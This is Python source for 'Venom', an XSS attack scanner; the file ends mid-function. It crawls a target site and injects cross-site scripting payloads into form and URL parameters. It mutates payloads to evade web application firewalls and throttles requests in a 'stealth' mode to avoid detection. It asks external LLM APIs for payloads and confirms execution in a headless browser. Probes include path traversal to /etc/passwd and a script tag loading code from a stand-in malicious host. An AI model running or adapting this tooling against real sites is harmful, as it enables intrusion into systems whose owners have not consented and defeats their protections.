#!/usr/bin/env python3
import requests
import sys
import re
import os
import time
import argparse
import threading
import queue
import random
import tempfile
import socket
from urllib.parse import urljoin, urlencode, urlparse, parse_qs
from bs4 import BeautifulSoup
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
import logging
from typing import Optional, List, Dict
import html
from requests.exceptions import RequestException
from concurrent.futures import ThreadPoolExecutor
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.metrics.pairwise import cosine_similarity
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import NoAlertPresentException, WebDriverException, TimeoutException

# Setup colorful logging
log_file = "venom.log"
class ColoredFormatter(logging.Formatter):
    COLORS = {
        'DEBUG': '\033[94m',  # Blue
        'INFO': '\033[92m',   # Green
        'WARNING': '\033[93m', # Yellow
        'ERROR': '\033[91m',  # Red
        'RESET': '\033[0m'
    }
    def format(self, record):
        log_msg = super().format(record)
        return f"{self.COLORS.get(record.levelname, self.COLORS['RESET'])}{log_msg}{self.COLORS['RESET']}"

logging.basicConfig(
    level=logging.DEBUG if '--verbose' in sys.argv else logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(log_file, mode='a', encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)
for handler in logging.getLogger().handlers:
    if isinstance(handler, logging.StreamHandler):
        handler.setFormatter(ColoredFormatter())
logging.info("Logging initialized successfully")

# Colors for terminal
RED, GREEN, YELLOW, RESET, BOLD, WHITE = '\033[91m', '\033[92m', '\033[93m', '\033[0m', '\033[1m', '\033[97m'
ORANGE, BLUE, PURPLE, CYAN = '\033[38;5;208m', '\033[94m', '\033[95m', '\033[96m'

class ThreadSafeCounter:
    def __init__(self):
        self.value = 0
        self.lock = threading.Lock()

    def increment(self):
        with self.lock:
            self.value += 1
            return self.value

    def get(self):
        with self.lock:
            return self.value

def sanitize_input(input_str: str) -> str:
    return re.sub(r'[;&|><`]', '', input_str)

def sanitize_path(path: str) -> str:
    return os.path.abspath(os.path.normpath(path))

def parse_post_file(file_path: str) -> tuple[Optional[str], Dict[str, str], Dict[str, str]]:
    url = None
    headers = {}
    data = {}
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            content = f.read().strip()
            lines = content.splitlines()
            if lines and lines[0].startswith("POST "):
                url_parts = lines[0].split()
                if len(url_parts) >= 2:
                    url = url_parts[1]
            in_headers = True
            body_start = 0
            for i, line in enumerate(lines[1:], 1):
                if not line.strip():
                    in_headers = False
                    body_start = i + 1
                    break
                if in_headers and ':' in line:
                    key, value = line.split(':', 1)
                    headers[sanitize_input(key.strip())] = sanitize_input(value.strip())
            if not url and 'Host' in headers:
                url = f"http://{headers['Host']}{url or '/'}"
            if body_start > 0 and body_start < len(lines):
                body = '&'.join(lines[body_start:]).strip()
                for pair in body.split('&'):
                    if '=' in pair:
                        key, value = pair.split('=', 1)
                        data[sanitize_input(key)] = sanitize_input(value)
            logging.info(f"Parsed POST file: URL={url}, Headers={headers}, Data={data}")
            return url, headers, data
    except Exception as e:
        logging.error(f"Failed to parse POST file {file_path}: {e}")
        return None, {}, {}
    return url, headers, data

def get_banner_and_features() -> str:
    banner = f"""
{BLUE}╔════════════════════════════════════════════════════════════════════╗{RESET}
{BLUE}║{RESET}          {CYAN}██╗   ██╗███████╗███╗   ██╗ ██████╗ ███╗   ███╗{RESET}           {BLUE}║{RESET}
{BLUE}║{RESET}          {CYAN}██║   ██║██╔════╝████╗  ██║██╔═══██╗████╗ ████║{RESET}           {BLUE}║{RESET}
{BLUE}║{RESET}          {CYAN}██║   ██║█████╗  ██╔██╗ ██║██║   ██║██╔████╔██║{RESET}           {BLUE}║{RESET}
{BLUE}║{RESET}          {CYAN}██║   ██║██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║{RESET}           {BLUE}║{RESET}
{BLUE}║{RESET}          {CYAN}╚██████╔╝███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║{RESET}           {BLUE}║{RESET}
{BLUE}║{RESET}           {CYAN}╚═════╝ ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝{RESET}           {BLUE}║{RESET}
{BLUE}║{RESET}                                                                    {BLUE}║{RESET}
{BLUE}║{RESET}                  {PURPLE}Venom Advanced XSS Scanner 2025{RESET}                   {BLUE}║{RESET}
{BLUE}║{RESET}                            {WHITE}Version 5.43{RESET}                            {BLUE}║{RESET}
{BLUE}║{RESET}    {GREEN}Made by: YANIV AVISROR | PENETRATION TESTER | ETHICAL HACKER{RESET}    {BLUE}║{RESET}
{BLUE}╚════════════════════════════════════════════════════════════════════╝{RESET}
"""
    features = [
        f"{WHITE}{BOLD}Advanced XSS detection with form input checks{RESET}",
        f"{WHITE}{BOLD}Robust URL validation and link crawling{RESET}",
        f"{WHITE}{BOLD}Ultra-slow, colorful output for readability{RESET}",
        f"{WHITE}{BOLD}Enhanced headless browser stability{RESET}",
        f"{WHITE}{BOLD}WAF/IPS evasion with dynamic payloads{RESET}",
        f"{WHITE}{BOLD}Custom payload integration with debugging{RESET}",
        f"{WHITE}{BOLD}AI-driven optimization for any site{RESET}",
        f"{WHITE}{BOLD}Professional-grade reporting{RESET}"
    ]
    return banner + "\n".join(f"{GREEN}●{RESET} {feature}" for feature in features) + "\n"

def parse_args() -> argparse.Namespace:
    banner_and_features = get_banner_and_features()
    description = f"""{banner_and_features}
Venom Advanced XSS Scanner is a professional-grade tool for ethical penetration testers to detect XSS vulnerabilities across any website. Version 5.43 enhances URL handling, reflection detection, and headless browser reliability.

Usage:
  python3 venom.py <url> [options]

Examples:
  python3 venom.py http://sudo.co.il/xss/level4.php --scan-xss --verbose --new-session -w 2 --ai-assist --verify-execution --stealth
    - Scans with stealth mode and advanced features.
"""
    
    parser = argparse.ArgumentParser(description=description, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("url", help="Target URL to scan (e.g., http://anywebsite.com).")
    parser.add_argument("-w", "--workers", type=int, default=5, help="Number of concurrent threads (default: 5, max: 20).")
    parser.add_argument("--ai-assist", action="store_true", help="Enable AI-driven payload optimization.")
    parser.add_argument("--ai-key", type=str, help="API key for external AI platform (e.g., xAI, OpenAI).")
    parser.add_argument("--ai-platform", type=str, choices=['xai-grok', 'openai-gpt3', 'google-gemini'],
                        help="External AI platform (requires --ai-key).")
    parser.add_argument("--scan-xss", action="store_true", help="Enable XSS scanning (required).", required=True)
    parser.add_argument("--payloads-dir", default="/usr/local/bin/payloads/", help="Directory with custom payload files.")
    parser.add_argument("--timeout", type=int, default=30, help="HTTP request timeout in seconds (default: 30).")
    parser.add_argument("--verbose", action="store_true", help="Enable detailed, colorful logging.")
    parser.add_argument("--stealth", action="store_true", help="Enable stealth mode: 2 workers, 5-15s delays.")
    parser.add_argument("--min-delay", type=float, help="Min delay between requests (default: 1 or 5 in stealth).")
    parser.add_argument("--max-delay", type=float, help="Max delay between requests (default: 2 or 15 in stealth).")
    parser.add_argument("--full-report", action="store_true", help="Show all vulnerabilities in final report.")
    parser.add_argument("-H", "--headers", action='append', default=[], help="Custom headers (e.g., 'Cookie: session=abc123').")
    parser.add_argument("--method", choices=['get', 'post', 'both'], default='both', help="HTTP method to test (default: both).")
    parser.add_argument("--data", type=str, help="POST data (e.g., 'key1=value1&key2=value2').")
    parser.add_argument("--post-file", type=str, help="TXT file with POST request (SQLmap format).")
    parser.add_argument("--payload-field", type=str, help="Specific field to inject payloads (e.g., 'email').")
    parser.add_argument("--login-url", type=str, help="Login URL for session authentication.")
    parser.add_argument("--login-data", type=str, help="Login credentials (e.g., 'username=admin&password=pass123').")
    parser.add_argument("--verify-execution", action="store_true", help="Verify executable XSS with headless browser.")
    parser.add_argument("--new-session", action="store_true", help="Start a new session, clearing cookies and prior data.")
    parser.add_argument("--use-403-bypass", action="store_true", help="Enable 403 bypass with specialized payloads.")
    parser.add_argument("--no-live-status", action="store_true", help="Disable live status updates.")

    print(banner_and_features)
    while True:
        response = input(f"{RED}[!] Ethical use only (YES/NO): {RESET}").strip().upper()
        if response == "YES":
            print(f"{GREEN}[+] Ethical use confirmed. Initiating scan...{RESET}")
            break
        elif response == "NO":
            print(f"{RED}[!] This tool is for ethical use only. Exiting.{RESET}")
            sys.exit(0)
        else:
            print(f"{YELLOW}[!] Please enter YES or NO.{RESET}")

    args = parser.parse_args()
    args.payloads_dir = sanitize_path(args.payloads_dir)
    args.workers = min(args.workers, 20)
    if args.stealth:
        args.workers = min(args.workers, 2)
        args.min_delay = args.min_delay if args.min_delay is not None else 5
        args.max_delay = args.max_delay if args.max_delay is not None else 15
        print(f"{GREEN}[+] Stealth mode: Workers {args.workers}, Delays {args.min_delay}-{args.max_delay}s{RESET}")
    else:
        args.min_delay = args.min_delay if args.min_delay is not None else 1.0
        args.max_delay = args.max_delay if args.max_delay is not None else 2.0
    
    if args.post_file:
        post_url, post_headers, post_data = parse_post_file(sanitize_path(args.post_file))
        if post_url and not args.url:
            args.url = post_url
        if not args.url:
            print(f"{RED}[!] No URL provided. Exiting.{RESET}")
            sys.exit(1)
        args.post_headers = post_headers
        args.post_data = post_data if not args.data else dict(pair.split('=', 1) for pair in args.data.split('&'))
        if post_headers:
            args.headers.extend([f"{k}: {v}" for k, v in post_headers.items()])
        print(f"{GREEN}[+] Loaded POST request from {args.post_file}{RESET}")
    
    if args.ai_platform and not args.ai_key:
        print(f"{RED}[!] --ai-platform requires --ai-key. Exiting.{RESET}")
        sys.exit(1)
    if args.login_url and not args.login_data:
        print(f"{RED}[!] --login-url requires --login-data. Exiting.{RESET}")
        sys.exit(1)
    
    command = " ".join(sys.argv)
    print(f"{GREEN}[+] Command: {command}{RESET}")
    return args

def fetch_payloads_from_github(timeout: int) -> List[str]:
    payloads = []
    headers = {'User-Agent': 'Venom-XSS-Scanner/5.43'}
    session = requests.Session()
    session.mount('https://', HTTPAdapter(max_retries=Retry(total=5, backoff_factor=2)))
    github_urls = [
        "https://raw.githubusercontent.com/payloadbox/xss-payload-list/master/Intruder/xss-payload-list.txt",
    ]
    for url in github_urls:
        try:
            response = session.get(url, headers=headers, timeout=timeout, verify=True)
            response.raise_for_status()
            payloads.extend([sanitize_input(p.strip()) for p in response.text.splitlines() if p.strip() and '<' in p])
            logging.info(f"Fetched {len(payloads)} payloads from {url}")
            break
        except RequestException as e:
            logging.error(f"Failed to fetch payloads from {url}: {e}")
    return payloads

class PayloadGenerator:
    def __init__(self, payloads_dir: str, bypass_needed: bool = False, use_403_bypass: bool = False, stealth: bool = False):
        self.payloads_dir = payloads_dir
        self.bypass_needed = bypass_needed
        self.use_403_bypass = use_403_bypass
        self.stealth = stealth
        self.payloads = self.load_payloads()
        self.previous_success = []

    def load_payloads(self) -> List[str]:
        default_payloads = [
            "<script>alert('venom')</script>",
            "<img src=x onerror=alert('venom')>",
            "<svg onload=alert('venom')>",
            "<body onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<input onfocus=alert(1) autofocus>",
            "<div onmouseover=alert(1)>test</div>",
            "autofocus/onfocus=\"confirm(document.domain)\""
        ]
        stealth_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert(1)>",
        ]
        
        payloads = []
        if not os.path.exists(self.payloads_dir):
            logging.error(f"Payloads directory {self.payloads_dir} does not exist!")
            return stealth_payloads if self.stealth else default_payloads

        category_map = {
            'waf_bypass': 'waf_bypass.txt',
            '403bypass': '403bypass.txt',
            'default': ['advanced_xss.txt', 'xss_payloads.txt', 'basic_xss.txt', 'custom_payloads.txt']
        }

        selected_category = 'waf_bypass' if self.bypass_needed else '403bypass' if self.use_403_bypass else 'default'
        all_files = [f for f in os.listdir(self.payloads_dir) if f.endswith('.txt')]
        if not all_files:
            logging.warning(f"No .txt files found in {self.payloads_dir}; using defaults.")
            return stealth_payloads if self.stealth else default_payloads

        if selected_category == 'default':
            for filename in category_map['default']:
                file_path = os.path.join(self.payloads_dir, filename)
                try:
                    if os.path.exists(file_path):
                        with open(file_path, 'r', encoding='utf-8') as f:
                            file_payloads = [sanitize_input(line.strip()) for line in f if line.strip()]
                            payloads.extend(file_payloads)
                            logging.info(f"Loaded {len(file_payloads)} payloads from {file_path}: {file_payloads[:5]}...")
                    else:
                        logging.warning(f"Payload file {file_path} not found.")
                except Exception as e:
                    logging.error(f"Error loading {file_path}: {e}")
        else:
            file_path = os.path.join(self.payloads_dir, category_map[selected_category])
            try:
                if os.path.exists(file_path):
                    with open(file_path, 'r', encoding='utf-8') as f:
                        payloads.extend(sanitize_input(line.strip()) for line in f if line.strip())
                    logging.info(f"Loaded {selected_category} payloads from {file_path}: {len(payloads)} payloads")
                else:
                    logging.warning(f"{selected_category} file {file_path} not found; falling back to defaults.")
                    payloads = default_payloads
            except Exception as e:
                logging.error(f"Error loading {file_path}: {e}")
                payloads = default_payloads

        if not self.stealth and not self.use_403_bypass:
            payloads.extend(fetch_payloads_from_github(15))
        
        unique_payloads = list(set(payloads))
        unique_payloads = [p for p in unique_payloads if p.strip()]
        logging.debug(f"Total unique payloads loaded: {len(unique_payloads)}")
        return unique_payloads if unique_payloads else (stealth_payloads if self.stealth else default_payloads)

    def optimize_payloads(self, response_text: str, active_params: List[str]) -> List[str]:
        html_context = '<input' in response_text or '<form' in response_text or '<textarea' in response_text
        js_context = '<script' in response_text or 'javascript:' in response_text or 'onload' in response_text
        optimized = []
        for payload in self.payloads:
            if any(success in payload for success in self.previous_success):
                optimized.append(payload)
            elif html_context and ('on' in payload.lower() or 'src=' in payload.lower() or 'autofocus' in payload.lower()):
                optimized.append(payload)
            elif js_context and ('alert(' in payload.lower() or 'javascript:' in payload.lower() or 'confirm(' in payload.lower()):
                optimized.append(payload)
            elif 'alert(' in payload.lower() or 'confirm(' in payload.lower() or 'javascript:' in payload.lower():
                optimized.append(payload)
        return optimized if optimized else self.payloads

    def generate_waf_bypass_payloads(self, base_payload: str) -> List[str]:
        return [
            base_payload.upper(),
            base_payload.replace('<', '%3C').replace('>', '%3E'),
            f"{base_payload[:5]}/*comment*/{base_payload[5:]}",
            base_payload.replace('alert', 'a\u006cert'),
            f"<!-->{base_payload}",
            f"{base_payload}<!--",
            base_payload.replace(' ', '\t'),
            f"//{base_payload}",
            f"/*{base_payload}*/",
            base_payload.encode('utf-16le').decode('utf-8', errors='ignore'),
            f"{base_payload.replace('<', '<\\').replace('>', '>\\'[::-1])}",
            f"{base_payload.replace('script', 'scri' + chr(0) + 'pt')}",
            f"data:text/html,{base_payload}",
            f"javascript:{base_payload}",
            f"{base_payload.replace('=', '%3D')}"
        ]

    def generate_403_bypass_payloads(self, base_payload: str) -> List[str]:
        return [
            f"//{base_payload}",
            f"/*/{base_payload}/*/",
            base_payload.replace(' ', '%20'),
            f"{base_payload};",
            f"{base_payload}#",
            f"\"{base_payload}\"",
        ]

    def generate(self) -> List[str]:
        return self.payloads

    def update_success(self, payload: str):
        self.previous_success.append(payload)

class AIAssistant:
    def __init__(self, payloads: List[str], api_key: Optional[str] = None, platform: Optional[str] = None):
        self.payloads = payloads
        self.api_key = api_key
        self.platform = platform
        self.api_endpoint = self.get_api_endpoint() if platform else None
        self.success_history: Dict[str, dict] = {}
        self.lock = threading.Lock()
        if self.api_key and self.api_endpoint:
            logging.info(f"AI assistance enabled with external platform: {platform}, endpoint: {self.api_endpoint}")
        else:
            logging.info("AI assistance enabled with local learning (no external API)")

    def get_api_endpoint(self) -> str:
        endpoints = {
            "xai-grok": "https://api.xai.com/v1/completions",
            "openai-gpt3": "https://api.openai.com/v1/completions",
            "google-gemini": "https://generativelanguage.googleapis.com/v1beta/models/gemini-pro:generateContent"
        }
        return endpoints.get(self.platform, "https://api.xai.com/v1/completions")

    def suggest_payloads(self, response: Optional[str] = None, initial_run: bool = False, status_code: int = 200) -> List[str]:
        executable_payloads = [p for p in self.payloads if any(x in p.lower() for x in ['alert(', 'on', 'confirm(', 'javascript:'])]
        other_payloads = [p for p in self.payloads if p not in executable_payloads]
        
        if status_code == 404 or "timed out" in str(response).lower():
            executable_payloads = sorted(executable_payloads, key=len)[:10]
        
        if self.api_key and self.api_endpoint and response:
            ai_suggestions = self.get_ai_suggestions(response)
            executable_payloads.extend(ai_suggestions)
            logging.info(f"External AI suggested {len(ai_suggestions)} payloads: {ai_suggestions[:5]}...")
        elif response:
            with self.lock:
                sorted_payloads = sorted(
                    executable_payloads,
                    key=lambda p: self.success_history.get(p, {"weight": 0.0})["weight"],
                    reverse=True
                )
            html_context = '<input' in response or '<form' in response or '<textarea' in response
            js_context = '<script' in response or 'javascript:' in response or 'onload' in response
            optimized = [p for p in sorted_payloads if (html_context and 'on' in p.lower()) or (js_context and any(x in p.lower() for x in ['alert(', 'confirm(']))]
            executable_payloads = optimized if optimized else sorted_payloads[:20]
            logging.info(f"Local AI optimized {len(executable_payloads)} payloads: {executable_payloads[:5]}...")
        
        return list(set(executable_payloads + other_payloads[:20]))

    def get_ai_suggestions(self, response: str) -> List[str]:
        try:
            headers = {"Authorization": f"Bearer {self.api_key}", "Content-Type": "application/json"}
            if self.platform == "google-gemini":
                data = {
                    "contents": [{"parts": [{"text": f"Suggest optimized XSS payloads for this response:\n{response[:500]}"}]}],
                    "generationConfig": {"maxOutputTokens": 50}
                }
            else:
                data = {
                    "prompt": f"Suggest optimized XSS payloads for this web response:\n{response[:500]}",
                    "max_tokens": 50,
                    "model": "grok" if self.platform == "xai-grok" else "text-davinci-003"
                }
            ai_response = requests.post(self.api_endpoint, json=data, headers=headers, timeout=10, verify=True)
            ai_response.raise_for_status()
            if self.platform == "google-gemini":
                suggestions = ai_response.json().get("candidates", [{}])[0].get("content", {}).get("parts", [{}])[0].get("text", "").splitlines()
            else:
                suggestions = ai_response.json().get("choices", [{}])[0].get("text", "").splitlines()
            return [sanitize_input(s.strip()) for s in suggestions if s.strip() and '<' in s]
        except RequestException as e:
            logging.error(f"AI API call failed for {self.platform}: {e}")
            return []

    def record_success(self, payload: str, context: str = "unknown", status_code: int = 200) -> None:
        with self.lock:
            if payload not in self.success_history:
                self.success_history[payload] = {"success_count": 0, "weight": 0.0, "context": context}
            if status_code == 200:
                self.success_history[payload]["success_count"] += 1
                self.success_history[payload]["weight"] = min(1.0, self.success_history[payload]["weight"] + 0.2)

def is_reflected(payload: str, response_text: str) -> bool:
    if not payload.strip():
        return False
    patterns = [
        payload,
        payload.lower(),
        html.escape(payload),
        urlencode({'x': payload})[2:],
        payload.replace('<', '%3C').replace('>', '%3E'),
        payload.encode('utf-16le').decode('utf-8', errors='ignore'),
        payload.replace(' ', ''),
        re.escape(payload),
        payload.encode('utf-8').hex(),
        payload.replace('alert', 'al\\ert'),
        payload.replace('<script', '<scr\\ipt'),
        payload[:len(payload)//2],
        payload[len(payload)//2:]
    ]
    response_lower = response_text.lower()
    soup = BeautifulSoup(response_text, 'html.parser')
    for pattern in patterns:
        if isinstance(pattern, str):
            if pattern in response_text or pattern.lower() in response_lower:
                logging.debug(f"Payload reflected in raw response: {pattern}")
                return True
            for tag in soup.find_all(['input', 'textarea', 'select']):
                if pattern.lower() in str(tag.get('value', '')).lower() or pattern.lower() in str(tag.attrs).lower():
                    logging.debug(f"Payload reflected in form input/attribute: {pattern}")
                    return True
    logging.debug(f"No reflection for {payload} in response: {response_text[:100]}...")
    return False

def is_executable_context(payload: str, soup: BeautifulSoup) -> bool:
    if not payload.strip():
        return False
    payload_lower = payload.lower()
    for tag in soup.find_all(True):
        tag_str = str(tag).lower()
        if payload_lower in tag_str:
            if tag.name == 'script' or '<script' in tag_str or 'javascript:' in tag_str:
                logging.debug(f"Executable context (script): {tag_str}")
                return True
            if tag.name in ['title', 'meta', 'style'] and not any(x in tag_str for x in ['on', 'javascript:', 'alert(', '<script']):
                logging.debug(f"Non-executable context ({tag.name}): {tag_str}")
                continue
            dangerous_attrs = ['onerror', 'onload', 'onclick', 'onmouseover', 'src', 'href', 'autofocus', 'onfocus', 'onblur', 'onchange']
            if any(attr in tag.attrs for attr in dangerous_attrs) or tag.name in ['iframe', 'object', 'svg', 'input', 'textarea']:
                logging.debug(f"Executable context (attribute): {tag_str}")
                return True
            for attr_value in tag.attrs.values():
                if isinstance(attr_value, str) and payload_lower in attr_value.lower() and any(attr in tag.attrs for attr in dangerous_attrs):
                    logging.debug(f"Executable context (attribute value): {tag_str}")
                    return True
    return False

class Venom:
    def __init__(self, args: argparse.Namespace):
        self.args = args
        self.session = requests.Session()
        self.session.mount('http://', HTTPAdapter(max_retries=Retry(total=10, backoff_factor=2), pool_maxsize=10))
        self.session.mount('https://', HTTPAdapter(max_retries=Retry(total=10, backoff_factor=2), pool_maxsize=10))
        self.session.headers.update({
            'User-Agent': random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0.4472.124 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)'
            ]),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Referer': 'https://www.google.com/'
        })

        self.update_headers(args.headers)
        self.post_data = args.post_data if hasattr(args, 'post_data') else {'test': 'default'}
        if args.data:
            self.post_data.update(dict(pair.split('=', 1) for pair in args.data.split('&')))

        if args.new_session:
            self.session.cookies.clear()
            self.vulnerabilities = []
            self.visited_urls = set()
            logging.info("New session created by clearing cookies and prior data")
        elif args.login_url and args.login_data:
            self.establish_session(args.login_url, args.login_data)

        self.task_queue = queue.Queue()
        self.lock = threading.Lock()
        self.vulnerabilities = [] if not hasattr(self, 'vulnerabilities') else self.vulnerabilities
        self.visited_urls = set() if not hasattr(self, 'visited_urls') else self.visited_urls
        self.total_tests = ThreadSafeCounter()
        self.total_payloads = 0
        self.current_payload = "Initializing..."
        self.current_param = "None"
        self.current_method = "None"
        self.current_cookie = "None"
        self.start_time = time.time()
        self.last_display_time = 0
        self.running = True
        self.domain = urlparse(args.url).netloc
        self.waf_ips_status = "Unknown"
        self.bypass_performed = False
        self.use_403_bypass = args.use_403_bypass
        self.is_waf_detected = False
        self.active_params = []
        self.headless_driver = None
        self.headless_runs = 0

        self.initial_waf_ips_check()
        self.payload_generator = PayloadGenerator(self.args.payloads_dir, self.bypass_performed, self.use_403_bypass, self.args.stealth)
        self.payloads = self.payload_generator.generate()
        self.total_payloads = len(self.payloads)
        self.ai_assistant = AIAssistant(self.payloads, self.args.ai_key, self.args.ai_platform) if self.args.ai_assist else None
        if args.verify_execution:
            self._init_headless_browser()
        
        print(f"{GREEN}[+] AI Assistance: {'Enabled (Local)' if self.ai_assistant and not self.args.ai_key else 'Enabled (External)' if self.ai_assistant else 'Disabled'}{RESET}")
        if self.use_403_bypass:
            print(f"{ORANGE}[+] 403 Bypass Enabled{RESET}")
        if self.args.no_live_status:
            print(f"{YELLOW}[+] Live status updates disabled{RESET}")
        if self.headless_driver:
            print(f"{PURPLE}[+] Headless browser enabled for execution verification{RESET}")

    def _init_headless_browser(self):
        for attempt in range(5):
            options = Options()
            options.headless = True
            options.add_argument(f"--user-data-dir={tempfile.mkdtemp()}")
            options.add_argument("--no-sandbox")
            options.add_argument("--disable-dev-shm-usage")
            options.add_argument("--disable-web-security")
            options.add_argument("--disable-gpu")
            port = random.randint(40000, 50000)
            while True:
                try:
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                        s.bind(('localhost', port))
                    break
                except OSError:
                    port += 1
            options.add_argument(f"--remote-debugging-port={port}")
            try:
                self.headless_driver = webdriver.Chrome(options=options)
                self.headless_driver.set_page_load_timeout(60)
                logging.info(f"Headless browser initialized on port {port}")
                return
            except WebDriverException as e:
                logging.error(f"Failed to initialize headless browser (attempt {attempt+1}): {e}. Retrying...")
                time.sleep(2)
        logging.error("Headless browser initialization failed after 5 attempts. Disabling verification.")
        self.args.verify_execution = False

    def update_headers(self, headers: List[str]) -> None:
        if not headers:
            return
        for header in headers:
            try:
                key, value = header.split(':', 1)
                sanitized_key = sanitize_input(key.strip())
                sanitized_value = sanitize_input(value.strip())
                self.session.headers.update({sanitized_key: sanitized_value})
                if sanitized_key.lower() == 'cookie':
                    logging.info(f"Custom Cookie added: {sanitized_value}")
                else:
                    logging.info(f"Custom Header added: {sanitized_key}: {sanitized_value}")
            except ValueError:
                logging.warning(f"Invalid header format: {header}. Expected 'Key: Value'.")

    def establish_session(self, login_url: str, login_data: str) -> bool:
        login_dict = dict(pair.split('=', 1) for pair in login_data.split('&'))
        try:
            response = self.session.post(login_url, data=login_dict, timeout=self.args.timeout, verify=True)
            if response.status_code in [200, 302]:
                logging.info(f"Login successful to {login_url}. Cookies: {dict(self.session.cookies)}")
                return True
            logging.warning(f"Login failed: Status {response.status_code}")
            return False
        except RequestException as e:
            logging.error(f"Login failed: {e}")
            return False

    def initial_waf_ips_check(self) -> None:
        try:
            test_payloads = [
                "<script>alert('waf_test')</script>",
                "1' OR '1'='1",
                "../../etc/passwd",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "javascript:alert(1)",
                "<iframe src=javascript:alert(1)>",
                "<input type='text' value='<script>alert(1)</script>'>",
                "<script src='http://example.com/malicious.js'></script>"
            ]
            for payload in test_payloads:
                response = self.session.get(self.args.url + "?test=" + urlencode({'': payload})[1:], timeout=self.args.timeout, verify=True)
                headers = response.headers
                content = response.text.lower()
                waf_indicators = {
                    'cloudflare': 'cf-ray',
                    'akamai': 'akamai',
                    'sucuri': 'sucuri',
                    'mod_security': 'mod_security',
                    'incapsula': 'incapsula',
                    'f5': 'f5',
                    'aws': 'x-amzn'
                }
                for tech, indicator in waf_indicators.items():
                    if indicator.lower() in str(headers).lower() or tech.lower() in content:
                        self.waf_ips_status = f"WAF detected ({tech})"
                        self.is_waf_detected = True
                        break
                if self.is_waf_detected:
                    break
                if any(x in content for x in ['blocked', 'forbidden', 'captcha', 'access denied', 'security']) or response.status_code in [403, 429]:
                    self.waf_ips_status = "WAF detected (behavioral)"
                    self.is_waf_detected = True
                    break
                if headers.get('Content-Security-Policy') or headers.get('X-XSS-Protection') or headers.get('X-Frame-Options'):
                    self.waf_ips_status = "IPS detected (headers present)"
                    self.is_waf_detected = True
                    break
            if not self.is_waf_detected:
                self.waf_ips_status = "No WAF/IPS detected"
            logging.info(f"WAF/IPS check result: {self.waf_ips_status}")
        except RequestException as e:
            self.waf_ips_status = "Check failed"
            logging.error(f"WAF/IPS check failed: {e}")

    def check_connection(self, url: str) -> bool:
        try:
            response = self.session.head(url, timeout=self.args.timeout, allow_redirects=True)
            return response.status_code < 400
        except RequestException as e:
            logging.error(f"Connection check failed for {url}: {e}")
            return False

    def crawl_links(self, base_url: str) -> List[str]:
        urls = set([base_url])
        if not self.check_connection(base_url):
            logging.error(f"Base URL {base_url} is not reachable. Aborting crawl.")
            return list(urls)
        
        try:
            response = self.session.get(base_url, timeout=self.args.timeout, verify=True)
            soup = BeautifulSoup(response.text, 'html.parser')
            for link in soup.find_all('a', href=True):
                absolute_url = urljoin(base_url, link['href'])
                parsed = urlparse(absolute_url)
                if parsed.netloc == self.domain and absolute_url not in self.visited_urls:
                    urls.add(absolute_url)
                    self.task_queue.put((absolute_url, 'get', {}))
            logging.info(f"Crawled {len(urls)} URLs from {base_url}")
        except RequestException as e:
            logging.error(f"Failed to crawl {base_url}: {e}")
        return list(urls)

    def extract_params(self, url: str, response_text: str) -> List[str]:
        params = set(parse_qs(urlparse(url).query).keys())
        soup = BeautifulSoup(response_text, 'html.parser')
        for form in soup.find_all('form'):
            for input_tag in form.find_all(['input', 'textarea', 'select']):
                if input_tag.get('name'):
                    params.add(input_tag['name'])
        self.active_params = list(params)
        logging.debug(f"Extracted parameters: {self.active_params}")
        return self.active_params

    def inject_payload(self, url: str, method: str, payload: str, param: str = None, data: Dict[str, str] = None) -> tuple[Optional[str], int]:
        try:
            if method.lower() == 'get':
                target_url = url
                if param:
                    parsed = urlparse(url)
                    query = parse_qs(parsed.query)
                    query[param] = payload
                    target_url = parsed._replace(query=urlencode(query, doseq=True)).geturl()
                response = self.session.get(target_url, timeout=self.args.timeout, verify=True)
            else:
                data = data.copy() if data else self.post_data.copy()
                if param:
                    data[param] = payload
                response = self.session.post(url, data=data, timeout=self.args.timeout, verify=True)
            
            return response.text, response.status_code
        except RequestException as e:
            logging.error(f"Payload injection failed for {url}: {e}")
            return None, 0

    def verify_execution(self, url: str, payload: str, method: str, param: str = None, data: Dict[str, str] = None) -> bool:
        if not self.headless_driver or self.headless_runs >= 10:
            logging.warning("Headless verification skipped (limit reached or not initialized)")
            return False
        
        try:
            self.headless_driver.delete_all_cookies()
            for cookie in self.session.cookies:
                self.headless_driver.add_cookie({'name': cookie.name, 'value': cookie.value, 'domain': self.domain})
            
            if method.lower() == 'get':
                target_url = url
                if param:
                    parsed = urlparse(url)
                    query = parse_qs(parsed.query)
                    query[param] = payload
                    target_url = parsed._replace(query=urlencode(query, doseq=True)).geturl()
                self.headless_driver.get(target_url)
            else:
                temp_file = tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.html')
                data = data.copy() if data else self.post_data.copy()
                if param:
                    data[param] = payload
                html_content = f"""
                <html><body><form id='test' method='post' action='{url}'>
                {''.join(f'<input name="{k}" value="{html.escape(v)}">' for k, v in data.items())}
                </form><script>document.getElementById('test').submit();</script></body></html>
                """
                temp_file.write(html_content)
                temp_file.close()
                self.headless_driver.get(f"file://{temp_file.name}")
            
            try:
                alert = self.headless_driver.switch_to.alert
                alert_text = alert.text
                alert.accept()
                logging.info(f"Payload executed: {payload} triggered alert '{alert_text}'")
